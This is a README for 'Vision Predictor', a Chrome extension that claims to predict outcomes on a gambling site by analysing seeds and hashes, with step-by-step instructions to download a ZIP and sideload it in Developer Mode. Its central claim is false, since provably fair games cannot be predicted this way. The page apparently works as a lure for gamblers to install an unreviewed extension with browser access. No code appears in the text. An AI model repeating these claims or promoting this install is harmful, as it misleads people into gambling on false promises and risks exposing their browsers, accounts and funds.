## 📖 About

**Vision Predictor** is a Chrome extension designed for [Bloxybet](https://chroma.gg) that leverages **seed & hash analysis** combined with **provably fair verification** to deliver intelligent game predictions. It processes historical data, calculates seed hash values, and adapts to patterns giving you data-driven insights in real time.

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔐 **Seed & Hash Analysis** | Deep analysis of server seeds and hash values to identify patterns |
| 🤖 **AI Coach** | Intelligent coaching system that guides your gameplay decisions |
| ⚡ **Quick Join** | Instantly join games based on your selected values and items — zero delays |
| 🚀 **Soon...** | More features, enhancements, and upcoming game support are in active development |

## 🚀 Installation

Since this extension is not published on the Chrome Web Store, you'll need to install it manually using **Developer Mode**.

### Step-by-step Guide

1. **Download the extension**
   
   [Click me For download](https://github.com/Sandorrx/Vision-Predictor/releases/download/vision/Vision.Predictor.zip)

2. **Extract the ZIP**
   - Extract the contents to a folder you'll remember

3. **Open Chrome Extensions**
   - Navigate to `chrome://extensions/` in your browser
   - Or go to **Browser Menu → Extensions**

4. **Enable Developer Mode**
   - Toggle the **"Developer mode"** switch in the top-right corner

5. **Load the extension**
   - Click **"Load unpacked"**
   - Select the extracted extension folder

6. **You're all set!** 🎉
   - The Vision Predictor icon should appear in your Chrome toolbar
   - Navigate to [chroma.gg](chroma.gg) to start using it
